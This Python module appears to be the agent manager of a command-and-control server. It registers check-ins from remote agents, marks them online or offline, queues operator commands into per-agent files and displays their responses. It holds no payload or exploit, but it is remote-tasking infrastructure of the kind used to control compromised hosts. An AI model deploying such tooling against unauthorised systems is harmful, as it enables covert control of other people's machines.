import os
import json
from datetime import datetime, timedelta
from utils import log_error, log_info

class AgentManager:
    def __init__(self, agent_config, upload_dir):
        self.agents = self.load_agents(agent_config)
        self.selected_agent = None
        self.command_queue = {}  # agent_id -> list of commands
        self.new_checkins = []  # Track new agent check-ins for animation
        self.upload_dir = upload_dir
        self.agent_config = agent_config
        self.notify_file = os.path.join(upload_dir, "notify.txt")
        self.command_dir = os.path.join(os.getcwd(), "commands")
        self.log_file = None  # Will be set by bsc2.py
        self.shown_responses = {}  # agent_id -> last response hash

    def load_agents(self, agent_config):
        try:
            if os.path.exists(agent_config):
                with open(agent_config, "r", encoding="utf-8") as f:
                    return json.load(f)
            log_info(f"No agent config found at {agent_config}, starting with empty list", self.log_file)
            return []
        except Exception as e:
            log_error(f"Failed to load agents from {agent_config}: {e}", self.log_file)
            return []

    def save_agents(self):
        try:
            with open(self.agent_config, "w", encoding="utf-8") as f:
                json.dump(self.agents, f, indent=4)
            log_info(f"Saved agents to {self.agent_config}", self.log_file)
        except Exception as e:
            log_error(f"Failed to save agents to {self.agent_config}: {e}", self.log_file)

    def add_agent(self, agent_id, hostname, ip):
        from colorama import Fore, Style
        if not agent_id:
            log_error("Attempted to add agent with empty agent_id", self.log_file)
            return
        if not any(agent["agent_id"] == agent_id for agent in self.agents):
            self.agents.append({
                "agent_id": agent_id,
                "hostname": hostname,
                "ip": ip,
                "last_seen": datetime.now().isoformat(),
                "status": "Online",
                "commands": [],
                "output": ""
            })
            self.new_checkins.append(agent_id)
            self.save_agents()
            command_file = os.path.join(self.command_dir, f"{agent_id}.json")
            try:
                os.makedirs(self.command_dir, exist_ok=True)
                with open(command_file, "w", encoding="utf-8") as f:
                    json.dump({"commands": []}, f)
                log_info(f"Created empty command file: {command_file}", self.log_file)
            except Exception as e:
                log_error(f"Failed to create command file {command_file}: {e}", self.log_file)
            print(f"{Fore.GREEN}[+] New agent detected: {agent_id} ({hostname}, {ip}) {Style.BRIGHT}*NEW*{Style.RESET_ALL}")
            log_info(f"Added agent: {agent_id} ({hostname}, {ip})", self.log_file)
        else:
            self.update_agent(agent_id)

    def update_agent(self, agent_id):
        for agent in self.agents:
            if agent["agent_id"] == agent_id:
                agent["last_seen"] = datetime.now().isoformat()
                agent["status"] = "Online"
                self.save_agents()
                log_info(f"Updated agent: {agent_id}", self.log_file)
                break

    def get_agent(self, agent_id):
        return next((agent for agent in self.agents if agent["agent_id"] == agent_id), None)

    def get_agents(self):
        return {agent["agent_id"]: agent for agent in self.agents}

    def remove_agent(self, agent_id):
        self.agents = [agent for agent in self.agents if agent["agent_id"] != agent_id]
        command_file = os.path.join(self.command_dir, f"{agent_id}.json")
        if os.path.exists(command_file):
            os.remove(command_file)
        self.save_agents()

    def prune_stale_agents(self, minutes=5):
        now = datetime.now()
        self.agents = [
            agent for agent in self.agents
            if datetime.fromisoformat(agent["last_seen"]) >= now - timedelta(minutes=minutes)
        ]
        self.save_agents()

    def check_notify_file(self):
        from colorama import Fore, Style
        if os.path.exists(self.notify_file):
            try:
                with open(self.notify_file, "r", encoding="utf-8") as f:
                    content = f.read().strip()
                    content = content.replace('\ufeff', '')
                    if content:
                        for line in content.splitlines():
                            line = line.strip()
                            if not line:
                                continue
                            if line.startswith("identifier="):
                                agent_id = line.split("=", 1)[1].strip()
                                if not agent_id:
                                    continue
                                hostname = "Unknown"
                                ip = "Unknown"
                                self.add_agent(agent_id, hostname, ip)
                    with open(self.notify_file, "w", encoding="utf-8") as f:
                        f.write("")
            except Exception as e:
                log_error(f"Error reading notify file {self.notify_file}: {e}", self.log_file)

        try:
            for file in os.listdir(self.upload_dir):
                if file.endswith("_response.txt"):
                    agent_id = file.replace("_response.txt", "")
                    response_path = os.path.join(self.upload_dir, file)
                    if not os.path.exists(response_path):
                        continue
                    with open(response_path, "r", encoding="utf-8") as f:
                        content = f.read().strip()
                    agent = self.get_agent(agent_id)
                    if agent:
                        if agent_id == self.selected_agent and self.shown_responses.get(agent_id) != content:
                            print(f"{Fore.CYAN}\n{'='*40}\nAgent ID: {agent_id}\n{'='*40}\n{content}\n{'='*40}\n{Style.RESET_ALL}")
                            self.shown_responses[agent_id] = content
                        agent["output"] = content
                        self.save_agents()
                        command_file = os.path.join(self.command_dir, f"{agent_id}.json")
                        with open(command_file, "w", encoding="utf-8") as f:
                            json.dump({"commands": []}, f)
                        if agent_id in self.command_queue:
                            self.command_queue[agent_id].clear()
                        os.remove(response_path)
        except Exception as e:
            log_error(f"Error checking responses: {e}", self.log_file)

        now = datetime.now()
        for agent in self.agents:
            try:
                last_seen = datetime.fromisoformat(agent["last_seen"])
                if now - last_seen > timedelta(seconds=30):
                    if agent["status"] != "Offline":
                        agent["status"] = "Offline"
                        log_info(f"Marked agent {agent['agent_id']} as Offline due to timeout", self.log_file)
                else:
                    if agent["status"] != "Online":
                        agent["status"] = "Online"
            except Exception as e:
                log_error(f"Failed to update agent status for {agent['agent_id']}: {e}", self.log_file)

        self.save_agents()

    def queue_command(self, agent_id, command):
        from colorama import Fore, Style
        if agent_id not in self.command_queue:
            self.command_queue[agent_id] = []
        if not self.command_queue[agent_id] or self.command_queue[agent_id][-1] != command:
            self.command_queue[agent_id].append(command)
            print(f"{Fore.YELLOW}[*] Command queued for agent {agent_id}: {command}{Style.RESET_ALL}")
            self.set_command(command, agent_id)

    def set_command(self, command, agent_id):
        from colorama import Fore, Style
        command_file = os.path.join(self.command_dir, f"{agent_id}.json")
        try:
            os.makedirs(self.command_dir, exist_ok=True)
            existing = {"commands": []}
            if os.path.exists(command_file):
                with open(command_file, "r", encoding="utf-8") as f:
                    existing = json.load(f)
                    if "commands" not in existing:
                        existing["commands"] = []

            if command not in existing["commands"]:
                existing["commands"].append(command)

            with open(command_file, "w", encoding="utf-8") as f:
                json.dump(existing, f, indent=2)

            log_info(f"Command appended: {command} for agent {agent_id}", self.log_file)
        except Exception as e:
            log_error(f"Error saving command to {command_file}: {e}", self.log_file)
